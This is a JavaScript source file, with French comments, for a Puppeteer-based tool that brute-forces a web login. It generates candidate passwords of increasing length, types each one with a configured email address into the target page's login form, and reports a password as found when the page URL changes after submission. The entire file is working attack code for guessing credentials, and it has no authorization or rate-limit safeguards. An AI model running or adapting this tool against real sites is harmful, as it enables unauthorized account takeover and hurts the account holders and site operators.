const puppeteer = require('puppeteer');
const WordGenerator = require('./wordGenerator');
const config = require('../config');

var browser, word;
var stop = false;

module.exports = {
  start: start,
  tryWord: tryWord,
};

async function start(min =4, max =20, startWord =WordGenerator.plage[0].repeat(min)){
  browser = await puppeteer.launch();
  word = startWord;

  try {
    const bonCode = await loop(max);
    if(!bonCode) console.log(`Code non trouvé`);
    else console.log(`Code trouvé : ${bonCode}`);
   } catch(e) {
    console.log('Error happend while connecting to the URL: ', e.message)
   }

  await browser.close();
}

// Boucle sur l'appel de la fonction getNextWord, tout en respectant le nombre maximum de Threads
async function loop(max =20){
	if(stop) return;

	while(word.length <= max){
		word = WordGenerator.getNextWord(word);
    var result = await tryWord(word);
    console.log(`${word} : ${result}`);
    if ( result ) return word
	}
  return false;
}


// Essayer de se connecter sur une URL a partir d'un mot : word 
async function tryWord(word){
  const page = await browser.newPage();
  await page.goto(config.URL);
  await page.waitForSelector('#email');
  await page.type('#email', config.EMAIL);
  await page.type('#password', word);
  await page.click('#submit');
  await page.waitForTimeout(3000);

  if(page.url() != config.URL) return true
  await page.close();
  return false
}